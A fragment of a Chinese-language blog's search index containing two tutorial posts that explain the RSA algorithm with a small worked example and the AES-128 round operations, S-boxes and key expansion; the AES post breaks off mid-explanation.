      </categories>
      
      
        <tags>
            
            <tag> APP </tag>
            
            <tag> 抓包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之RSA</title>
      <link href="/2024/06/19/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRSA/"/>
      <url>/2024/06/19/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BRSA/</url>
      
        <content type="html"><![CDATA[<h1 id="一-简介"><a href="#一-简介" class="headerlink" title="一 简介"></a>一 简介</h1><p>RSA加密算法是一种非对称加密算法，所谓非对称，就是指该算法加密和解密使用不同的密钥，即使用加密密钥进行加密、解密密钥进行解密。在RAS算法中，加密密钥（即公开密钥）PK是公开信息，而解密密钥（即秘密密钥）SK是需要保密的。加密算法E和解密算法D也都是公开的。虽然解密密钥SK是由公开密钥PK决定的，由于无法计算出大数n的欧拉函数phi(N)，所以不能根据PK计算出SK。</p><p>也就是说，对极大整数做因数分解的难度决定了RSA算法的可靠性。理论上，只要其钥匙的长度n足够长，用RSA加密的信息实际上是不能被解破的。</p><p>RSA算法通常是先生成一对RSA密钥，其中之一是保密密钥，由用户保存；另一个为公开密钥，可对外公开。为提高保密强度，RSA密钥至少为500位长，一般推荐使用1024位。这就使加密的计算量很大。为减少计算量，在传送信息时，常采用传统加密方法与公开密钥加密方法相结合的方式，即信息采用改进的DES或IDEA密钥加密，然后使用RSA密钥加密对话密钥和信息摘要。对方收到信息后，用不同的密钥解密并可核对信息摘要。</p><p><strong>RSA密钥长度随着保密级别提高，增加很快。</strong>下表列出了对同一安全级别所对应的密钥长度。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939635.png" alt="img"> </p><h1 id="二-RSA加密过程"><a href="#二-RSA加密过程" class="headerlink" title="二 RSA加密过程"></a>二 RSA加密过程</h1><p>RSA的加密过程可以使用一个通式来表达：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939049.png" alt="img"> </p><p>也就是说RSA加密是对明文的E次方后除以N后求余数的过程。从通式可知，只要知道E和N任何人都可以进行RSA加密了，所以说E、N是RSA加密的密钥，也就是说<strong>E和N的组合就是公钥</strong>，我们用(E,N)来表示公钥：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200939028.png" alt="img"> </p><p>不过E和N不并不是随便什么数都可以的，它们都是经过严格的数学计算得出的，关于E和N拥有什么样的要求及其特性后面会讲到。E是加密（Encryption）的首字母，N是数字（Number）的首字母。</p><h1 id="三-RSA解密过程"><a href="#三-RSA解密过程" class="headerlink" title="三 RSA解密过程"></a>三 RSA解密过程</h1><p>RSA的解密同样可以使用一个通式来表达：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944123.png" alt="img"> </p><p>也就是说对密文进行D次方后除以N的余数就是明文，这就是RSA解密过程。知道D和N就能进行解密密文了，所以D和N的组合就是私钥：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944134.png" alt="img"> </p><p>从上述可以看出RSA的加密方式和解密方式是相同的，加密是求“E次方的mod N”;解密是求“D次方的mod N”。此处D是解密（Decryption）的首字母；N是数字（Number）的首字母。</p><p>小结：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406200944454.png" alt="image.png"> </p><h1 id="四-生成密钥对"><a href="#四-生成密钥对" class="headerlink" title="四 生成密钥对"></a>四 生成密钥对</h1><p>既然公钥是（E，N），私钥是（D，N），所以密钥对即为（E，D，N），但密钥对是怎样生成的？步骤如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">求N</span><br><span class="line">求L（L为中间过程的中间数）</span><br><span class="line">求E</span><br><span class="line">求D</span><br></pre></td></tr></table></figure><h2 id="求N："><a href="#求N：" class="headerlink" title="求N："></a>求N：</h2><p>准备两个互质数p，q。这两个数不能太小，太小则会容易破解，将p乘以q就是N。如果互质数p和q足够大，那么根据目前的计算机技术和其他工具，至今也没能从N分解出p和q。换句话说，只要密钥长度N足够大（一般1024足矣），基本上不可能从公钥信息推出私钥信息。</p><p>N &#x3D; p * q</p><h2 id="求L："><a href="#求L：" class="headerlink" title="求L："></a>求L：</h2><p>L 是 p－1 和 q－1的最小公倍数，可用如下表达式表示</p><p>L &#x3D; lcm（p－1，q－1）</p><h2 id="求E："><a href="#求E：" class="headerlink" title="求E："></a>求E：</h2><p>E必须满足两个条件：E是一个比1大比L小的数，E和L的最大公约数为1；</p><p>用gcd(X,Y)来表示X，Y的最大公约数则E条件如下：</p><p>1 &lt; E &lt; L</p><p>gcd（E，L）&#x3D;1</p><h2 id="求D："><a href="#求D：" class="headerlink" title="求D："></a>求D：</h2><p>数D是由数E计算出来的，数D必须保证足够大。D、E和L之间必须满足以下关系：</p><p>1 &lt; D &lt; L</p><p>E＊D mod L ＝ 1</p><p>只要D满足上述2个条件，则通过E和N进行加密的密文就可以用D和N进行解密。简单地说条件2是为了保证密文解密后的数据就是明文。</p><p>现在私钥自然也已经生成了，密钥对也就自然生成了。</p><p>小结：</p><table><thead><tr><th>求N</th><th>N＝ p ＊ q ；p，q为质数</th></tr></thead><tbody><tr><td>求L</td><td>L＝lcm（p－1，q－1） ；L为p－1、q－1的最小公倍数</td></tr><tr><td>求E</td><td>1 &lt; E &lt; L，gcd（E，L）&#x3D;1；E，L最大公约数为1（E和L互质）</td></tr><tr><td>求D</td><td>1 &lt; D &lt; L，E＊D mod L ＝ 1</td></tr></tbody></table><h1 id="五-实践"><a href="#五-实践" class="headerlink" title="五 实践"></a>五 实践</h1><p>为了计算方便，p q 的值取小一旦，假设：p ＝ 17，q ＝ 19，则：</p><p>（1）求N：N ＝ p ＊ q ＝ 323；</p><p>（2）求L：L ＝ lcm（p－1， q－1）＝ lcm(16，18） ＝ 144，144为16和18对最小公倍数；</p><p>（3）求E：1 &lt; E &lt; L ，gcd（E，L）&#x3D;1，即1 &lt; E &lt; 144，gcd（E，144） ＝ 1，E和144互为质数，E &#x3D; 5显然满足上述2个条件，故E ＝ 5，此时<strong>公钥&#x3D; (E，N）＝（5，323）</strong>；</p><p>（4）求D：求D也必须满足2个条件：1 &lt; D &lt; L，E＊D mod L ＝ 1，即1 &lt; D &lt; 144，5 ＊ D mod 144 ＝ 1，显然当D＝ 29 时满足上述两个条件。1 &lt; 29 &lt; 144，5＊29 mod 144 ＝ 145 mod 144 ＝ 1，此时私钥＝（D，N）＝（29，323）；</p><p>（5）加密：准备的明文必须是小于N的数，因为加密或者解密都要 mod N，其结果必须小于N。</p><p>假设明文 ＝ 123，则 密文＝（123的5次方）mod 323&#x3D;225</p><p>（6）解密：明文＝（225的29次方）mod 323 &#x3D;123，所以解密后的明文为123。</p>]]></content>
      
      
      <categories>
          
          <category> 算法还原 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法还原 </tag>
            
            <tag> RSA </tag>
            
            <tag> 非对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之AES</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BAES/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8BAES/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><hr><p>参考文章：</p><p><a href="https://blog.csdn.net/xnxqwzy/article/details/136698541">https://blog.csdn.net/xnxqwzy/article/details/136698541</a></p><p><a href="https://www.cnblogs.com/yunshangkanjing/p/12765147.html">https://www.cnblogs.com/yunshangkanjing/p/12765147.html</a></p><p><a href="https://blog.csdn.net/qq_43529443/article/details/117386078">https://blog.csdn.net/qq_43529443/article/details/117386078</a></p><p><a href="https://blog.csdn.net/weixin_44767965/article/details/122520302">https://blog.csdn.net/weixin_44767965/article/details/122520302</a></p><hr><h1 id="一-AES简介"><a href="#一-AES简介" class="headerlink" title="一 AES简介"></a>一 AES简介</h1><p>高级加密标准(AES,Advanced Encryption Standard)为最常见的对称加密算法(微信小程序加密传输就是用这个加密算法的)。对称加密算法也就是加密和解密用相同的密钥，具体的加密流程如下图： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180942347.png" alt="image-20240618094250255"> </p><p>下面说明一下各个字段的作用与意义：</p><p><strong>明文p：</strong></p><p>没有经过加密的数据。</p><p><strong>密钥K</strong>：</p><p>用来加密明文的密码，在对称加密算法中，加密与解密的密钥是相同的。</p><p>密钥为接收方与发送方协商产生，但不可以直接在网络上传输，否则可能会导致密钥泄露，通常是通过非对称加密算法加密密钥，然后再通过网络传输给对方，或者直接面对面协商密钥。密钥是绝对不能泄露的，否则会被攻击者还原密文，窃取机密数据。</p><p><strong>AES加密函数</strong>：</p><p>设AES加密函数为E，则 C &#x3D; E(K, P),其中P为明文，K为密钥，C为密文。也就是说，把明文P和密钥K作为加密函数的参数输入，则加密函数E会输出密文C。</p><p><strong>密文C</strong>：</p><p>经过加密函数处理后的数据</p><p><strong>AES解密函数</strong>：</p><p>设AES解密函数为D，则 P &#x3D; D(K, C),其中C为密文，K为密钥，P为明文。也就是说，把密文C和密钥K作为解密函数的参数输入，则解密函数会输出明文P。</p><h1 id="二-AES算法原理"><a href="#二-AES算法原理" class="headerlink" title="二 AES算法原理"></a>二 AES算法原理</h1><p>AES为分组密码，分组密码也就是把明文分成一组一组的，每组长度相等，每次加密一组数据，直到加密完整个明文。在AES标准规范中，分组长度只能是128位，也就是说，每个分组为16个字节（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><p>假设这里实现的是AES-128，也就是密钥的长度为128位，加密轮数为10轮。 </p><p>上面说到，AES的加密公式为C &#x3D; E(K,P)，在加密函数E中，会执行一个<strong>轮函数</strong>，并且<strong>执行10次这个****轮函数</strong>，这个轮函数的前9次执行的操作是一样的，只有第10次有所不同。也就是说，一个明文分组会被加密10轮。AES的核心就是实现一轮中的所有操作。</p><h2 id="明文处理"><a href="#明文处理" class="headerlink" title="明文处理"></a>明文处理</h2><p>AES的处理单位是字节，128位的输入明文分组P和输入密钥K都被分成16个字节，分别记为P &#x3D; P0 P1 … P15 和 K &#x3D; K0 K1 … K15。如，明文分组为P &#x3D; abcdefghijklmnop,其中的字符a对应P0，p对应P15。一般地，明文分组用字节为单位的正方形矩阵描述，称为状态矩阵。在算法的每一轮中，状态矩阵的内容不断发生变化，最后的结果作为密文输出。该矩阵中字节的排列顺序为从上到下、从左至右依次排列，如下图所示： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180954828.png" alt="image-20240618095435786"> </p><p>现在假设明文分组P为”abcdefghijklmnop”，则对应上面生成的状态矩阵图如下： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180956474.png" alt="image-20240618095624432"> </p><p>上图中，0x61为字符a的十六进制表示。可以看到，明文经过明文处理后，已经面目全非。</p><h2 id="密钥处理"><a href="#密钥处理" class="headerlink" title="密钥处理"></a>密钥处理</h2><p>类似地，128位密钥也是用字节为单位的矩阵表示，矩阵的每一列被称为1个32位比特字。通过密钥编排函数该密钥矩阵被扩展成一个44个字组成的序列W[0],W[1], … ,W[43],该序列的前4个元素W[0],W[1],W[2],W[3]是原始密钥，用于加密运算中的初始密钥加（下面介绍）;后面40个字分为10组，每组4个字（128比特）分别用于10轮加密运算中的轮密钥加，如下图所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406180958600.png" alt="image-20240618095805551"> </p><p>上图中，设K &#x3D; “abcdefghijklmnop”，则K0 &#x3D; a, K15 &#x3D; p, W[0] &#x3D; K0 K1 K2 K3 &#x3D; “abcd”。</p><p>AES的整体结构如下图所示，其中的W[0,3]是指W[0]、W[1]、W[2]和W[3]串联组成的128位密钥。加密的第1轮到第9轮的轮函数一样，包括4个操作：字节代换、行位移、列混合和轮密钥加。最后一轮迭代不执行列混合。另外，在第一轮迭代之前，先将明文和原始密钥进行一次异或加密操作。 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181000960.png" alt="image-20240618100036920"> </p><p>上图也展示了AES解密过程，解密过程仍为10轮，每一轮的操作是加密操作的逆操作。由于AES的4个轮操作都是可逆的，因此，解密操作的一轮就是顺序执行逆行移位、逆字节代换、轮密钥加和逆列混合。同加密操作类似，最后一轮不执行逆列混合，在第1轮解密之前，要执行1次密钥加操作。</p><p>下面分别介绍AES中一轮的4个操作阶段，这4分操作阶段使输入位得到充分的混淆。</p><h2 id="AES算法流程"><a href="#AES算法流程" class="headerlink" title="AES算法流程"></a>AES算法流程</h2><p>AES加密算法涉及4种操作：<strong>字节替代</strong>（SubBytes）、<strong>行移位</strong>（ShiftRows）、<strong>列混淆</strong>（MixColumns）和<strong>轮密钥加</strong>（AddRoundKey）。下图给出了AES加解密的流程：</p><ul><li>解密算法的每一步分别对应加密算法的逆操作；</li><li>加解密所有操作的顺序正好是相反的。正是由于这几点（再加上加密算法与解密算法每步的操作互逆）保证了算法的正确性。加解密中每轮的密钥分别由种子密钥经过密钥扩展算法得到。算法中16字节的明文、密文和轮子密钥都以一个4x4的矩阵表示。</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181107947.jpeg" alt="img"> </p><h3 id="字节替换"><a href="#字节替换" class="headerlink" title="字节替换"></a>字节替换</h3><p>AES的字节代换其实就是一个简单的查表操作。AES定义了一个S盒和一个逆S盒。<br><strong>AES的S盒</strong>：</p><table><thead><tr><th>行&#x2F;列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x63</td><td>0x7c</td><td>0x77</td><td>0x7b</td><td>0xf2</td><td>0x6b</td><td>0x6f</td><td>0xc5</td><td>0x30</td><td>0x01</td><td>0x67</td><td>0x2b</td><td>0xfe</td><td>0xd7</td><td>0xab</td><td>0x76</td></tr><tr><td>1</td><td>0xca</td><td>0x82</td><td>0xc9</td><td>0x7d</td><td>0xfa</td><td>0x59</td><td>0x47</td><td>0xf0</td><td>0xad</td><td>0xd4</td><td>0xa2</td><td>0xaf</td><td>0x9c</td><td>0xa4</td><td>0x72</td><td>0xc0</td></tr><tr><td>2</td><td>0xb7</td><td>0xfd</td><td>0x93</td><td>0x26</td><td>0x36</td><td>0x3f</td><td>0xf7</td><td>0xcc</td><td>0x34</td><td>0xa5</td><td>0xe5</td><td>0xf1</td><td>0x71</td><td>0xd8</td><td>0x31</td><td>0x15</td></tr><tr><td>3</td><td>0x04</td><td>0xc7</td><td>0x23</td><td>0xc3</td><td>0x18</td><td>0x96</td><td>0x05</td><td>0x9a</td><td>0x07</td><td>0x12</td><td>0x80</td><td>0xe2</td><td>0xeb</td><td>0x27</td><td>0xb2</td><td>0x75</td></tr><tr><td>4</td><td>0x09</td><td>0x83</td><td>0x2c</td><td>0x1a</td><td>0x1b</td><td>0x6e</td><td>0x5a</td><td>0xa0</td><td>0x52</td><td>0x3b</td><td>0xd6</td><td>0xb3</td><td>0x29</td><td>0xe3</td><td>0x2f</td><td>0x84</td></tr><tr><td>5</td><td>0x53</td><td>0xd1</td><td>0x00</td><td>0xed</td><td>0x20</td><td>0xfc</td><td>0xb1</td><td>0x5b</td><td>0x6a</td><td>0xcb</td><td>0xbe</td><td>0x39</td><td>0x4a</td><td>0x4c</td><td>0x58</td><td>0xcf</td></tr><tr><td>6</td><td>0xd0</td><td>0xef</td><td>0xaa</td><td>0xfb</td><td>0x43</td><td>0x4d</td><td>0x33</td><td>0x85</td><td>0x45</td><td>0xf9</td><td>0x02</td><td>0x7f</td><td>0x50</td><td>0x3c</td><td>0x9f</td><td>0xa8</td></tr><tr><td>7</td><td>0x51</td><td>0xa3</td><td>0x40</td><td>0x8f</td><td>0x92</td><td>0x9d</td><td>0x38</td><td>0xf5</td><td>0xbc</td><td>0xb6</td><td>0xda</td><td>0x21</td><td>0x10</td><td>0xff</td><td>0xf3</td><td>0xd2</td></tr><tr><td>8</td><td>0xcd</td><td>0x0c</td><td>0x13</td><td>0xec</td><td>0x5f</td><td>0x97</td><td>0x44</td><td>0x17</td><td>0xc4</td><td>0xa7</td><td>0x7e</td><td>0x3d</td><td>0x64</td><td>0x5d</td><td>0x19</td><td>0x73</td></tr><tr><td>9</td><td>0x60</td><td>0x81</td><td>0x4f</td><td>0xdc</td><td>0x22</td><td>0x2a</td><td>0x90</td><td>0x88</td><td>0x46</td><td>0xee</td><td>0xb8</td><td>0x14</td><td>0xde</td><td>0x5e</td><td>0x0b</td><td>0xdb</td></tr><tr><td>A</td><td>0xe0</td><td>0x32</td><td>0x3a</td><td>0x0a</td><td>0x49</td><td>0x06</td><td>0x24</td><td>0x5c</td><td>0xc2</td><td>0xd3</td><td>0xac</td><td>0x62</td><td>0x91</td><td>0x95</td><td>0xe4</td><td>0x79</td></tr><tr><td>B</td><td>0xe7</td><td>0xc8</td><td>0x37</td><td>0x6d</td><td>0x8d</td><td>0xd5</td><td>0x4e</td><td>0xa9</td><td>0x6c</td><td>0x56</td><td>0xf4</td><td>0xea</td><td>0x65</td><td>0x7a</td><td>0xae</td><td>0x08</td></tr><tr><td>C</td><td>0xba</td><td>0x78</td><td>0x25</td><td>0x2e</td><td>0x1c</td><td>0xa6</td><td>0xb4</td><td>0xc6</td><td>0xe8</td><td>0xdd</td><td>0x74</td><td>0x1f</td><td>0x4b</td><td>0xbd</td><td>0x8b</td><td>0x8a</td></tr><tr><td>D</td><td>0x70</td><td>0x3e</td><td>0xb5</td><td>0x66</td><td>0x48</td><td>0x03</td><td>0xf6</td><td>0x0e</td><td>0x61</td><td>0x35</td><td>0x57</td><td>0xb9</td><td>0x86</td><td>0xc1</td><td>0x1d</td><td>0x9e</td></tr><tr><td>E</td><td>0xe1</td><td>0xf8</td><td>0x98</td><td>0x11</td><td>0x69</td><td>0xd9</td><td>0x8e</td><td>0x94</td><td>0x9b</td><td>0x1e</td><td>0x87</td><td>0xe9</td><td>0xce</td><td>0x55</td><td>0x28</td><td>0xdf</td></tr><tr><td>F</td><td>0x8c</td><td>0xa1</td><td>0x89</td><td>0x0d</td><td>0xbf</td><td>0xe6</td><td>0x42</td><td>0x68</td><td>0x41</td><td>0x99</td><td>0x2d</td><td>0x0f</td><td>0xb0</td><td>0x54</td><td>0xbb</td><td>0x16</td></tr></tbody></table><p>状态矩阵中的元素按照下面的方式映射为一个新的字节：把该字节的高4位作为行值，低4位作为列值，取出S盒或者逆S盒中对应的行的元素作为输出。例如，加密时，输出的字节S1为0x12,则查S盒的第0x01行和0x02列，得到值0xc9,然后替换S1原有的0x12为0xc9。</p><p>状态矩阵经字节代换后的图如下： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181109579.png" alt="image-20240618110914545"> </p><p>逆字节代换也就是查逆S盒来变换，逆S盒如下：</p><table><thead><tr><th>行&#x2F;列</th><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th></tr></thead><tbody><tr><td>0</td><td>0x52</td><td>0x09</td><td>0x6a</td><td>0xd5</td><td>0x30</td><td>0x36</td><td>0xa5</td><td>0x38</td><td>0xbf</td><td>0x40</td><td>0xa3</td><td>0x9e</td><td>0x81</td><td>0xf3</td><td>0xd7</td><td>0xfb</td></tr><tr><td>1</td><td>0x7c</td><td>0xe3</td><td>0x39</td><td>0x82</td><td>0x9b</td><td>0x2f</td><td>0xff</td><td>0x87</td><td>0x34</td><td>0x8e</td><td>0x43</td><td>0x44</td><td>0xc4</td><td>0xde</td><td>0xe9</td><td>0xcb</td></tr><tr><td>2</td><td>0x54</td><td>0x7b</td><td>0x94</td><td>0x32</td><td>0xa6</td><td>0xc2</td><td>0x23</td><td>0x3d</td><td>0xee</td><td>0x4c</td><td>0x95</td><td>0x0b</td><td>0x42</td><td>0xfa</td><td>0xc3</td><td>0x4e</td></tr><tr><td>3</td><td>0x08</td><td>0x2e</td><td>0xa1</td><td>0x66</td><td>0x28</td><td>0xd9</td><td>0x24</td><td>0xb2</td><td>0x76</td><td>0x5b</td><td>0xa2</td><td>0x49</td><td>0x6d</td><td>0x8b</td><td>0xd1</td><td>0x25</td></tr><tr><td>4</td><td>0x72</td><td>0xf8</td><td>0xf6</td><td>0x64</td><td>0x86</td><td>0x68</td><td>0x98</td><td>0x16</td><td>0xd4</td><td>0xa4</td><td>0x5c</td><td>0xcc</td><td>0x5d</td><td>0x65</td><td>0xb6</td><td>0x92</td></tr><tr><td>5</td><td>0x6c</td><td>0x70</td><td>0x48</td><td>0x50</td><td>0xfd</td><td>0xed</td><td>0xb9</td><td>0xda</td><td>0x5e</td><td>0x15</td><td>0x46</td><td>0x57</td><td>0xa7</td><td>0x8d</td><td>0x9d</td><td>0x84</td></tr><tr><td>6</td><td>0x90</td><td>0xd8</td><td>0xab</td><td>0x00</td><td>0x8c</td><td>0xbc</td><td>0xd3</td><td>0x0a</td><td>0xf7</td><td>0xe4</td><td>0x58</td><td>0x05</td><td>0xb8</td><td>0xb3</td><td>0x45</td><td>0x06</td></tr><tr><td>7</td><td>0xd0</td><td>0x2c</td><td>0x1e</td><td>0x8f</td><td>0xca</td><td>0x3f</td><td>0x0f</td><td>0x02</td><td>0xc1</td><td>0xaf</td><td>0xbd</td><td>0x03</td><td>0x01</td><td>0x13</td><td>0x8a</td><td>0x6b</td></tr><tr><td>8</td><td>0x3a</td><td>0x91</td><td>0x11</td><td>0x41</td><td>0x4f</td><td>0x67</td><td>0xdc</td><td>0xea</td><td>0x97</td><td>0xf2</td><td>0xcf</td><td>0xce</td><td>0xf0</td><td>0xb4</td><td>0xe6</td><td>0x73</td></tr><tr><td>9</td><td>0x96</td><td>0xac</td><td>0x74</td><td>0x22</td><td>0xe7</td><td>0xad</td><td>0x35</td><td>0x85</td><td>0xe2</td><td>0xf9</td><td>0x37</td><td>0xe8</td><td>0x1c</td><td>0x75</td><td>0xdf</td><td>0x6e</td></tr><tr><td>A</td><td>0x47</td><td>0xf1</td><td>0x1a</td><td>0x71</td><td>0x1d</td><td>0x29</td><td>0xc5</td><td>0x89</td><td>0x6f</td><td>0xb7</td><td>0x62</td><td>0x0e</td><td>0xaa</td><td>0x18</td><td>0xbe</td><td>0x1b</td></tr><tr><td>B</td><td>0xfc</td><td>0x56</td><td>0x3e</td><td>0x4b</td><td>0xc6</td><td>0xd2</td><td>0x79</td><td>0x20</td><td>0x9a</td><td>0xdb</td><td>0xc0</td><td>0xfe</td><td>0x78</td><td>0xcd</td><td>0x5a</td><td>0xf4</td></tr><tr><td>C</td><td>0x1f</td><td>0xdd</td><td>0xa8</td><td>0x33</td><td>0x88</td><td>0x07</td><td>0xc7</td><td>0x31</td><td>0xb1</td><td>0x12</td><td>0x10</td><td>0x59</td><td>0x27</td><td>0x80</td><td>0xec</td><td>0x5f</td></tr><tr><td>D</td><td>0x60</td><td>0x51</td><td>0x7f</td><td>0xa9</td><td>0x19</td><td>0xb5</td><td>0x4a</td><td>0x0d</td><td>0x2d</td><td>0xe5</td><td>0x7a</td><td>0x9f</td><td>0x93</td><td>0xc9</td><td>0x9c</td><td>0xef</td></tr><tr><td>E</td><td>0xa0</td><td>0xe0</td><td>0x3b</td><td>0x4d</td><td>0xae</td><td>0x2a</td><td>0xf5</td><td>0xb0</td><td>0xc8</td><td>0xeb</td><td>0xbb</td><td>0x3c</td><td>0x83</td><td>0x53</td><td>0x99</td><td>0x61</td></tr><tr><td>F</td><td>0x17</td><td>0x2b</td><td>0x04</td><td>0x7e</td><td>0xba</td><td>0x77</td><td>0xd6</td><td>0x26</td><td>0xe1</td><td>0x69</td><td>0x14</td><td>0x63</td><td>0x55</td><td>0x21</td><td>0x0c</td><td>0x7d</td></tr></tbody></table><h3 id="行移位"><a href="#行移位" class="headerlink" title="行移位"></a>行移位</h3><p>行移位是一个简单的左循环移位操作。当密钥长度为128比特时，状态矩阵的第0行左移0字节，第1行左移1字节，第2行左移2字节，第3行左移3字节，如下图所示： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181113762.png" alt="image-20240618111336722"> </p><p><strong>行移位的逆变换</strong></p><p>行移位的逆变换是将状态矩阵中的每一行执行相反的移位操作，例如AES-128中，状态矩阵的第0行右移0字节，第1行右移1字节，第2行右移2字节，第3行右移3字节。</p><h3 id="列混合"><a href="#列混合" class="headerlink" title="列混合"></a>列混合</h3><p>列混合变换是通过矩阵相乘来实现的，经行移位后的状态矩阵与固定的矩阵相乘，得到混淆后的状态矩阵，如下图的公式所示： </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181114991.png" alt="img"> </p><p>状态矩阵中的第j列(0 ≤j≤3)的列混合可以表示为下图所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181114813.png" alt="img"> </p><p>其中，矩阵元素的乘法和加法都是定义在基于GF(2^8)上的二元运算,并不是通常意义上的乘法和加法。这里涉及到一些信息安全上的数学知识，不过不懂这些知识也行。其实这种二元运算的加法等价于两个字节的异或，乘法则复杂一点。对于一个8位的二进制数来说，使用域上的乘法乘以(00000010)等价于左移1位(低位补0)后，再根据情况同(00011011)进行异或运算，设S1 &#x3D; (a7 a6 a5 a4 a3 a2 a1 a0)，刚0x02 * S1如下图所示：<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181118158.png" alt="img"><br>也就是说，如果a7为1，则进行异或运算，否则不进行。<br>类似地，乘以(00000100)可以拆分成两次乘以(00000010)的运算：<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119503.png" alt="img"><br>乘以(0000 0011)可以拆分成先分别乘以(0000 0001)和(0000 0010)，再将两个乘积异或：<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119744.png" alt="img"><br>因此，我们只需要实现乘以2的函数，其他数值的乘法都可以通过组合来实现。<br>下面举个具体的例子,输入的状态矩阵如下：</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>C9</td><td>E5</td><td>FD</td><td>2B</td></tr><tr><td>7A</td><td>F2</td><td>78</td><td>6E</td></tr><tr><td>63</td><td>9C</td><td>26</td><td>67</td></tr><tr><td>B0</td><td>A7</td><td>82</td><td>E5</td></tr></tbody></table><p>下面，进行列混合运算：<br>以第一列的运算为例：<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181118167.png" alt="img"><br>其它列的计算就不列举了，列混合后生成的新状态矩阵如下：</p><table><thead><tr><th></th><th></th><th></th><th></th></tr></thead><tbody><tr><td>D4</td><td>E7</td><td>CD</td><td>66</td></tr><tr><td>28</td><td>02</td><td>E5</td><td>BB</td></tr><tr><td>BE</td><td>C6</td><td>D6</td><td>BF</td></tr><tr><td>22</td><td>0F</td><td>DF</td><td>A5</td></tr></tbody></table><p>*<strong>列混合逆运算*</strong></p><p>逆向列混合变换可由下图的矩阵乘法定义：<br><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181119462.png" alt="img"><br>可以验证，逆变换矩阵同正变换矩阵的乘积恰好为单位矩阵。</p><h3 id="轮密钥加"><a href="#轮密钥加" class="headerlink" title="轮密钥加"></a>轮密钥加</h3><p>轮密钥加是将128位轮密钥Ki同状态矩阵中的数据进行逐位异或操作，如下图所示。其中，密钥Ki中每个字W[4i],W[4i+1],W[4i+2],W[4i+3]为32位比特字，包含4个字节，他们的生成算法下面在下面介绍。轮密钥加过程可以看成是字逐位异或的结果，也可以看成字节级别或者位级别的操作。也就是说，可以看成S0 S1 S2 S3 组成的32位字与W[4i]的异或运算。 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181121659.png" alt="image-20240618112115618"> </p><p>轮密钥加的逆运算同正向的轮密钥加运算完全一致，这是因为异或的逆操作是其自身。轮密钥加非常简单，但却能够影响S数组中的每一位。</p><p><strong>密钥扩展</strong></p><p>AES首先将初始密钥输入到一个4*4的状态矩阵中，如下图所示。 </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181121748.png" alt="image-20240618112136705"> </p><p>这个4*4矩阵的每一列的4个字节组成一个字，矩阵4列的4个字依次命名为W[0]、W[1]、W[2]和W[3]，它们构成一个以字为单位的数组W。例如，设密钥K为”abcdefghijklmnop”,则K0 &#x3D; ‘a’,K1 &#x3D; ‘b’, K2 &#x3D; ‘c’,K3 &#x3D; ‘d’,W[0] &#x3D; “abcd”。<br>接着，对W数组扩充40个新列，构成总共44列的扩展密钥数组。新列以如下的递归方式产生：<br>1.如果i<strong>不是4的倍数</strong>，那么第i列由如下等式确定：<br>W[i]&#x3D;W[i-4]⨁W[i-1]<br>2.如果i<strong>是4的倍数</strong>，那么第i列由如下等式确定：<br>W[i]&#x3D;W[i-4]⨁T(W[i-1]) </p><p>其中，T是一个有点复杂的函数。<br>函数T由3部分组成：字循环、字节代换和轮常量异或，这3部分的作用分别如下。<br>a.字循环：将1个字中的4个字节循环左移1个字节。即将输入字[b0, b1, b2, 